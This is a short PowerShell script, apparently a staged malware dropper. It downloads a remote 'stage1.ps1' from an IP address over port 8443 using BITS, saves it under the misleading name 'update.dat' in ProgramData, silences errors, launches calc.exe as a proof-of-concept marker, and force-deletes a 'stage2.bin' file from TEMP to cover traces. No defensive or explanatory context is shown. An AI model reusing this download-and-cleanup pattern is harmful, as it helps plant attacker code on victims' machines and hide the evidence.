$PayloadUrl = "https://198.51.100.50:8443/stage1.ps1"
$DropPath = 'C:\ProgramData\update.dat'
$TransferTimeout = 189
Start-BitsTransfer -Source $PayloadUrl -Destination $DropPath -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
